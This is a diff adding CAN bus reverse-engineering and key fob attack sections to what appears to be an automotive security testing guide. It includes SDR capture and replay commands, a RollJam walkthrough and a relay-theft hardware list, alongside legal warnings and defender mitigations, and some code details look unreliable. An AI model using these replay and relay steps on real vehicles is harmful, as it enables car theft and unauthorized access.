@@ -342,6 +342,506 @@ Document the cleanup in the engagement report; the OEM's CSMS audit will check.
 
 ---
 
+## CAN Bus Reverse Engineering Methodology
+
+DBC file generation is the bottleneck for any CAN injection engagement. A correctly reversed DBC turns a 4-week engagement into a 4-hour one. The methodology below is the field-tested workflow used across multiple published vehicle security assessments (Miller & Valasek 2014-2015; Keen Lab 2017; Comma.ai openpilot 2019-present).
+
+### Step 1: Baseline Capture
+
+Before any analysis, capture a long baseline under controlled conditions.
+
+```bash
+# 1. Establish controlled conditions:
+#    - Vehicle stationary, ignition ON, engine off (or idling if needed)
+#    - Driver seat occupied
+#    - All accessories OFF (HVAC, lights, audio)
+#    - Brake NOT depressed
+#    - Steering wheel at center (0 degrees)
+#    - Gear selector in Park
+#    - Outside on flat ground, no slope
+
+# 2. Capture 5-10 minutes of baseline traffic
+candump -L can0 > baseline_park.asc &
+BASELINE_PID=$!
+sleep 300   # 5 minutes
+kill $BASELINE_PID
+
+# 3. Inventory observed arbitration IDs and their rates
+awk '{print $2}' baseline_park.asc | awk -F'#' '{print $1}' | sort | uniq -c | sort -rn | head -30 > baseline_rates.txt
+cat baseline_rates.txt
+# Output format: count <arbitration_id>
+#   12345 7E0     (diagnostic, ~40 Hz from TesterPresent if you have a tool polling)
+#   10000 2A0     (engine status, ~33 Hz = typical 30ms period)
+#    5000 3F2     (body status, ~16 Hz)
+```
+
+### Step 2: Signal Identification by Side-Channel
+
+The core technique: change ONE physical state, capture the bus, diff against baseline. The arbitration IDs whose data changed are the ones carrying the signal.
+
+```python
+#!/usr/bin/env python3
+# diff_capture.py — diff two CAN captures to find which IDs changed
+import sys, argparse
+
+def parse_asc(path):
+    """Parse a candump ASC file into {arb_id: [data_bytes,...]}."""
+    frames = {}
+    with open(path) as f:
+        for line in f:
+            parts = line.strip().split()
+            if len(parts) < 3 or '#' not in parts[2]:
+                continue
+            try:
+                arb_id = int(parts[2].split('#')[0], 16)
+                data = bytes.fromhex(parts[2].split('#')[1].split('_')[0])
+                frames.setdefault(arb_id, []).append(data)
+            except (ValueError, IndexError):
+                continue
+    return frames
+
+def diff_buses(base, test):
+    """Find arbitration IDs whose data differs between base and test."""
+    changed = []
+    for arb_id in sorted(set(base) & set(test)):
+        base_last = base[arb_id][-1]
+        test_last = test[arb_id][-1]
+        if base_last != test_last:
+            # XOR to find changed bits
+            xor = bytes(a ^ b for a, b in zip(base_last, test_last))
+            changed.append((arb_id, base_last, test_last, xor))
+    return changed
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('baseline')
+    parser.add_argument('test')
+    args = parser.parse_args()
+    base = parse_asc(args.baseline)
+    test = parse_asc(args.test)
+    changed = diff_buses(base, test)
+    print(f"Found {len(changed)} changed arbitration IDs:")
+    for arb_id, b, t, x in changed:
+        print(f"  0x{arb_id:03X}:")
+        print(f"    base: {b.hex()}")
+        print(f"    test: {t.hex()}")
+        print(f"    xor:  {x.hex()} (changed bits)")
+```
+
+**Standard side-channel triggers and what they reveal:**
+
+| Action | Expected Changed IDs | Signal |
+|--------|----------------------|--------|
+| Depress brake pedal | 0x0E5, 0x165, 0x2A0 | Brake pressure, brake switch |
+| Turn steering wheel 90° left | 0x025, 0x2A0, 0x3F2 | Steering angle |
+| Press accelerator | 0x0E5, 0x165 | Throttle position, pedal position |
+| Shift into Drive | 0x1E5, 0x3F0 | Gear selector |
+| Turn on headlights | 0x3E0, 0x3E5 | Light switch status |
+| Turn on wipers | 0x400, 0x405 | Wiper switch status |
+| Open driver door | 0x3F5, 0x420 | Door status |
+| Increase RPM (in Park) | 0x0C4, 0x0E5 | Engine RPM, throttle |
+| Toggle high beam | 0x3E5, 0x3F0 | High beam switch |
+
+### Step 3: DBC File Generation
+
+Once you've identified candidate arbitration IDs and bit positions, encode them into a DBC file. The DBC format is text-based; you can hand-write it or use cantools to validate.
+
+```python
+#!/usr/bin/env python3
+# write_dbc.py — generate a minimal DBC from reverse-engineered signals
+import cantools
+
+dbc_content = """VERSION ""
+
+NS_ :
+
+BS_:
+
+BU_: XXX
+
+BO_ 224 EngineStatus: 8 XXX
+ SG_ EngineRPM : 0|16@1+ (0.25,0) [0|16383.75] "RPM" XXX
+ SG_ ThrottlePosition : 16|8@1+ (0.4,0) [0|100] "%" XXX
+ SG_ EngineTemp : 24|8@1+ (1,-40) [-40|215] "degC" XXX
+
+BO_ 356 BrakeStatus: 8 XXX
+ SG_ BrakePressure : 0|16@1+ (0.1,0) [0|6553.5] "bar" XXX
+ SG_ BrakeSwitch : 16|1@1+ (1,0) [0|1] "" XXX
+ SG_ ABSActive : 17|1@1+ (1,0) [0|1] "" XXX
+
+BO_ 1010 SteeringStatus: 8 XXX
+ SG_ SteeringAngle : 0|16@1- (0.1,0) [-3276.8|3276.7] "deg" XXX
+ SG_ SteeringTorque : 16|16@1- (0.1,0) [-3276.8|3276.7] "Nm" XXX
+"""
+
+with open('reversed.dbc', 'w') as f:
+    f.write(dbc_content)
+
+# Validate by loading
+db = cantools.database.load_file('reversed.dbc')
+print(f"DBC valid: {len(db.messages)} messages")
+for msg in db.messages:
+    print(f"  0x{msg.frame_id:03X} {msg.name}: {len(msg.signals)} signals")
+```
+
+### Step 4: ID Arbitration Analysis
+
+CAN arbitration is non-destructive: the lowest arbitration ID wins. Low IDs = high priority. Identify which IDs are safety-critical by their priority range.
+
+```bash
+# Sort captured IDs by arbitration priority
+awk '{print $2}' baseline_park.asc | awk -F'#' '{print $1}' | sort -u | sort -n | head -30
+# Typical output (Hyundai-Kia platform):
+#   004    Engine torque request (highest priority, safety-critical)
+#   005    Brake command
+#   020    ABS status
+#   03C    Steering angle
+#   07F    Vehicle speed
+#   ...
+#   2A0    Engine RPM (informational)
+#   3F2    Body status
+#   7E0    Diagnostic (lowest priority for application traffic)
+
+# The 0x000-0x0FF range is almost always safety-critical powertrain
+# The 0x100-0x2FF range is standard powertrain
+# The 0x300-0x4FF range is chassis
+# The 0x500-0x6FF range is body
+# The 0x700+ range is diagnostic
+```
+
+### Step 5: Multi-Frame CAN Analysis
+
+Messages longer than 7 bytes use ISO-TP (ISO 15765-2) segmentation: a First Frame (0x1X prefix) followed by Consecutive Frames (0x2X prefix). UDS responses (VIN, DTC lists) and some proprietary multi-frame messages use this.
+
+```bash
+# Identify ISO-TP multi-frame messages in a capture
+grep -E ' [0-9A-F]{3}#1[0-9A-F] ' baseline_park.asc | head -5
+#   First Frame format: <arb_id>#1X<total_len_high><total_len_low><data...>
+#   Example: 7E0#1014020100000000 (FF, len=0x0140=320 bytes)
+
+# Consecutive Frames follow
+grep -E ' [0-9A-F]{3}#2[0-9A-F] ' baseline_park.asc | head -5
+#   CF format: <arb_id>#2X<data...>
+#   Example: 7E0#2101010203040506 (CF, seq=1, data=...)
+
+# Reassemble ISO-TP messages with python-isotp:
+pip3 install isotp
+python3 <<'EOF'
+import isotp, can
+
+bus = can.interface.Bus(interface='socketcan', channel='can0')
+# isotp.Notifier-based reassembly
+stack = isotp.Notifier(bus, address=isotp.Address(isotp.AddressingMode.Normal_11Bits, target_id=0x7E0))
+# Send a UDS request that triggers a multi-frame response (VIN read)
+req = can.Message(arbitration_id=0x7E0, data=bytes([0x03, 0x22, 0xF1, 0x90, 0, 0, 0, 0]))
+bus.send(req)
+# Receive the reassembled message
+response = stack.recv(block=True, timeout=2.0)
+print(f"Reassembled: {response.hex()}")
+# Decode VIN: skip 0x10, 0x14, 0x62, 0xF1, 0x90 prefix
+vin_bytes = response[5:5+17]
+print(f"VIN: {vin_bytes.decode('ascii')}")
+EOF
+```
+
+### Step 6: DBC Validation
+
+A reversed DBC is dangerous to use for injection until validated. Validate at least 3 signals against known-good physical state.
+
+```python
+#!/usr/bin/env python3
+# validate_dbc.py — validate a reversed DBC against physical reality
+import can, cantools, time, statistics
+
+db = cantools.database.load_file('reversed.dbc')
+bus = can.interface.Bus(interface='socketcan', channel='can0')
+
+# 1. Capture a sample
+print("Capturing 30-second sample for validation...")
+samples = {}
+end_time = time.time() + 30
+while time.time() < end_time:
+    msg = bus.recv(timeout=1.0)
+    if msg:
+        samples.setdefault(msg.arbitration_id, []).append((msg.timestamp, msg.data))
+
+# 2. Decode and validate
+for arb_id, frames in samples.items():
+    try:
+        message = db.get_message_by_frame_id(arb_id)
+    except KeyError:
+        continue
+    print(f"\n0x{arb_id:03X} ({message.name}):")
+    decoded_samples = []
+    for ts, data in frames:
+        decoded = message.decode(data)
+        decoded_samples.append((ts, decoded))
+    # Report statistics
+    for signal in message.signals:
+        values = [d[signal.name] for ts, d in decoded_samples if signal.name in d]
+        if values:
+            print(f"  {signal.name}: min={min(values)}, max={max(values)}, "
+                  f"mean={statistics.mean(values):.2f}, n={len(values)}")
+            # Sanity checks
+            if signal.name == 'EngineRPM':
+                if max(values) > 8000:
+                    print(f"    WARNING: RPM >8000 is unrealistic — check scaling")
+            elif signal.name == 'VehicleSpeed':
+                if max(values) > 300:
+                    print(f"    WARNING: speed >300 km/h is unrealistic — check scaling")
+            elif signal.name == 'SteeringAngle':
+                if abs(max(values)) > 720 or abs(min(values)) > 720:
+                    print(f"    WARNING: steering >720 deg is unrealistic — check scaling")
+```
+
+---
+
+## Key Fob Attack Workflow
+
+Key fob attacks split into two families: rolling-code replay (older 433/868 MHz remotes) and PKES relay (modern proximity-based). The toolchain and methodology differ significantly.
+
+### Rolling-Code Capture with HackRF / SDR
+
+The rolling-code workflow: capture raw RF, identify the modulation and protocol, extract the rolling code, and (for vulnerable implementations) replay later.
+
+```bash
+# ─── Step 1: Capture the raw RF signal ───
+# US frequency: 433.92 MHz (most common); EU: 433.92 or 868.3 MHz; Asia: 315 MHz
+# HackRF One is the gold standard (~$300); RTL-SDR works for capture-only (~$25)
+hackrf_transfer -r fob_press1.cs8 -f 433920000 -s 2000000 -l 16 -g 40 -a 0
+#   -r output file (.cs8 = 8-bit signed IQ samples)
+#   -f frequency in Hz (433.92 MHz)
+#   -s sample rate (2 MS/s is sufficient for 433 MHz OOK)
+#   -l 16 = IF gain 16 dB; -g 40 = RF amp on; -a 0 = antenna power off
+# Press the key fob button during the 5-second capture window
+# Output: fob_press1.cs8 (~20 MB for 5 seconds at 2 MS/s)
+
+# Capture multiple presses for analysis
+for i in 2 3 4 5; do
+    hackrf_transfer -r fob_press${i}.cs8 -f 433920000 -s 2000000 -l 16 -g 40 -a 0 &
+    sleep 1
+    echo "Press fob button now (${i}/5)..."
+    wait
+done
+
+# ─── Step 2: Visual analysis in inspectrum ───
+# Inspectrum is a waterfall viewer for SDR captures
+sudo apt-get install inspectrum
+inspectrum fob_press1.cs8
+# In inspectrum:
+#   - Set sample rate to 2 MS/s
+#   - Adjust the FFT size and waterfall until you see a clear burst pattern
+#   - The burst duration and symbol rate identify the protocol family:
+#     ~10 ms burst at 2 kbaud  = Microchip HCS200/HCS301 (KeeLoq)
+#     ~25 ms burst at 1 kbaud  = Princeton/EV1527 (fixed code)
+#     ~50 ms burst at 5 kbaud  = Modern rolling code (varies)
+#   - Export the demodulated bitstream
+
+# ─── Step 3: Auto-detect protocol with rtl_433 ───
+rtl_433 -r fob_press1.cs8 -A -vv
+# -A = analyze mode (try to identify the protocol)
+# -vv = very verbose
+# Common outputs:
+#   "HCS301: button=0x01, serial=0xABCDEF12, encrypted=0x11223344, counter=0x1234"
+#   "Princeton-24bit: code=0x123456"
+#   "Unknown protocol — try analyzing manually"
+
+# ─── Step 4: Manual demodulation with Universal Radio Hacker ───
+sudo apt-get install urh
+urh
+# In URH:
+#   - Open fob_press1.cs8
+#   - Set modulation: OOK (On-Off Keying) for most key fobs
+#   - Set bit length: typically 100-500 us (2-10 kbaud)
+#   - Detect the protocol structure: preamble, sync, data, checksum
+#   - Save the demodulated bitstream
+```
+
+### Rolling-Code Analysis
+
+```python
+#!/usr/bin/env python3
+# analyze_rolling_code.py — analyze a captured rolling-code transmission
+# Detects: fixed-code, KeeLoq rolling-code, or modern encrypted rolling-code
+import sys
+
+def load_bits(path):
+    """Load a bitstream file (one bit per character, '0' or '1')."""
+    with open(path) as f:
+        return f.read().strip()
+
+def detect_protocol(bits):
+    """Identify the protocol family from the bitstream."""
+    n = len(bits)
+    print(f"Bitstream length: {n} bits")
+    
+    if n == 12 or n == 24:
+        return "Princeton/EV1527 fixed-code (replay trivially)"
+    elif n == 66:
+        return "Microchip HCS200/HCS301 (KeeLoq rolling-code)"
+        # HCS301 structure:
+        #   - 34-bit fixed portion (button + serial)
+        #   - 32-bit encrypted portion (rolling counter + discrimination)
+    elif n == 96:
+        return "Modern rolling-code (varies by OEM)"
+    elif n in (74, 76, 80):
+        return "Older Asian-market remote"
+    else:
+        return f"Unknown — bit length {n} doesn't match known protocols"
+
+def extract_hcs301(bits):
+    """Extract fields from a Microchip HCS301 transmission."""
+    # HCS301 format (66 bits):
+    #   - Preamble: 12 bits (not always transmitted)
+    #   - Header: 0xFFFE
+    #   - Encrypted: 32 bits (counter + discrimination)
+    #   - Serial: 28 bits
+    #   - Button: 4 bits
+    #   - Status/VLow: 2 bits
+    if len(bits) < 66:
+        return None
+    # Align to start of fixed portion
+    # (alignment is heuristic — look for the header pattern)
+    encrypted_hex = hex(int(bits[0:32], 2))
+    serial_hex = hex(int(bits[32:60], 2))
+    button_hex = hex(int(bits[60:64], 2))
+    return {
+        'encrypted': encrypted_hex,
+        'serial': serial_hex,
+        'button': button_hex,
+    }
+
+if __name__ == '__main__':
+    bits = load_bits(sys.argv[1])
+    protocol = detect_protocol(bits)
+    print(f"Detected: {protocol}")
+    if 'HCS' in protocol:
+        fields = extract_hcs301(bits)
+        if fields:
+            print(f"HCS301 fields: {fields}")
+            print(f"  To replay: transmit the same bitstream via hackrf_transfer -t <file>")
+            print(f"  Note: rolling code increments; replay only works once per counter value")
+```
+
+### RollJam Attack Workflow
+
+The RollJam attack captures two consecutive codes by jamming the first and capturing the second. The jammed code remains valid for later use.
+
+```bash
+# RollJam requires concurrent jam + capture — illegal in most jurisdictions.
+# The conceptual workflow:
+
+# 1. Setup: two HackRF One devices
+#    HackRF A: transmits a jamming signal on the key fob frequency (433.92 MHz)
+#    HackRF B: captures the fob's transmission despite the jam
+# 2. User presses fob:
+#    Fob transmits code N (the "current" code)
+#    HackRF A jams it; the car doesn't receive code N
+#    HackRF B captures code N
+# 3. User presses fob again (thinking the first press failed):
+#    Fob transmits code N+1
+#    HackRF A jams it; the car doesn't receive code N+1
+#    HackRF B captures code N+1
+# 4. Attacker replays code N+1 immediately:
+#    Car receives code N+1 (valid); unlocks
+#    Car's counter is now at N+1
+# 5. Later, attacker replays code N:
+#    Car still accepts code N (synchronous window typically allows N-1 to N+1)
+#    Or car accepts code N because the next-expected counter is N+2,
+#    but the sync window allows a 16-code rollback
+#    The car unlocks again
+
+# Detection footprint: high (sustained jamming is detectable; some
+# modern fobs use frequency hopping to resist jam).
+
+# Mitigation: dual-frequency rolling code, RF power anomaly detection,
+# secure time-based codes (challenge-response instead of one-way).
+```
+
+### PKES Relay Attack Setup
+
+The PKES relay attack doesn't break crypto; it relays the physical-layer challenge and response. The setup is hardware-intensive.
+
+```
+┌────────────┐                                ┌────────────┐
+│   Thief A  │                                │   Thief B  │
+│  (at car)  │                                │  (at fob)  │
+└──────┬─────┘                                └──────┬─────┘
+       │ LF loop antenna (125 kHz)                   │ LF loop antenna
+       │ placed near car door handle                 │ placed near fob
+       │                                             │
+       │ Car sends LF challenge                      │ Fob receives LF challenge
+       │ → received by Thief A's antenna             │ (relayed from Thief A)
+       │                                             │
+       │                                             │ Fob sends UHF response
+       │                                             │ → received by Thief B's antenna
+       │ Car receives UHF response                   │
+       │ ← relayed from Thief B                      │
+       │                                             │
+       │ → UNLOCK / START                            │
+       │                                             │
+       └──── Analog RF link or Wi-Fi ────────────────┘
+                 (carries LF + UHF bidirectionally)
+```
+
+Hardware required (bill of materials):
+
+| Component | Cost | Purpose |
+|-----------|------|---------|
+| 2x LF loop antenna (125 kHz) | $50 each | Receive car's LF challenge, transmit to fob |
+| 2x UHF Yagi antenna (433 or 868 MHz) | $30 each | Receive fob's UHF response, transmit to car |
+| 2x bidirectional RF amplifier | $200 each | Boost signals over the relay link |
+| 2x HackRF One or similar SDR | $300 each | Optional; for signal analysis |
+| 2x Raspberry Pi or analog relay board | $50 each | Carry the relay signal |
+| Wi-Fi or analog RF link | varies | Connect Thief A and Thief B |
+
+Total: ~$1000-$2000 for a working relay rig.
+
+**Documented vulnerable vehicles (pre-2018):** Tesla Model S, BMW i-series, Audi A6/A8, Mercedes E-class, Land Rover Range Rover, Lexus LS, multiple others.
+
+**Mitigation (post-2018):** UWB (IEEE 802.15.4z) time-of-flight ranging, motion sensors in the fob (sleep when stationary), multi-band challenges. Modern BMW, Audi, and Mercedes have moved to UWB-based PKES.
+
+### Signal Replay Methodology
+
+For fixed-code or compromised rolling-code implementations, replay is the final step.
+
+```bash
+# Replay a captured signal via HackRF:
+hackrf_transfer -t fob_press1.cs8 -f 433920000 -s 2000000 -a 1 -x 47 -R
+#   -t transmit file (.cs8 from capture)
+#   -f frequency (must match capture)
+#   -s sample rate (must match capture)
+#   -a 1 = antenna power on
+#   -x 47 = TX VGA gain (47 dB max)
+#   -R = repeat (loop the file)
+
+# For one-shot replay (no loop):
+hackrf_transfer -t fob_press1.cs8 -f 433920000 -s 2000000 -a 1 -x 47
+
+# Flipper Zero SubGHz replay workflow:
+# 1. SubGHz app → Read RAW → capture → save as .sub
+# 2. SubGHz app → Saved → select file → Send
+# Flipper Zero is the cheapest path (~$169) and works for many fixed-code protocols
+
+# Legal status (CRITICAL):
+# US: 18 USC §1029 (access device fraud) — rolling code IS an access device
+# UK: Fraud Act 2006, Computer Misuse Act 1990 — relay possession is criminal
+#    Courts have convicted on possession alone (Khan/Sullivan, 2023)
+# EU: similar national laws; no research carve-out
+# ALWAYS obtain explicit written authorization before capturing or replaying key fob signals
+```
+
+### Key Fob Detection (Defender)
+
+For the defender, key fob attacks are detectable via:
+
+- **LF anomaly detection** — monitor LF transmissions from the car; if the challenge is being relayed (unusually long path), the round-trip time exceeds the expected ~100 ns.
+- **UHF power anomaly** — a relay amplifier introduces ~5-10 dB of additional noise; detectable by signal-level monitoring.
+- **Motion sensor in fob** — if the fob has been stationary for >2 minutes, sleep and refuse challenges. Defeats the "fob on the nightstand" attack.
+- **UWB ranging** — modern vehicles with UWB measure the distance to the fob via time-of-flight; reject if distance >2m.
+
+---
+
 ## Real-World Incidents
 
 ### Jeep Cherokee (2015) — Miller & Valasek, DEF CON 23
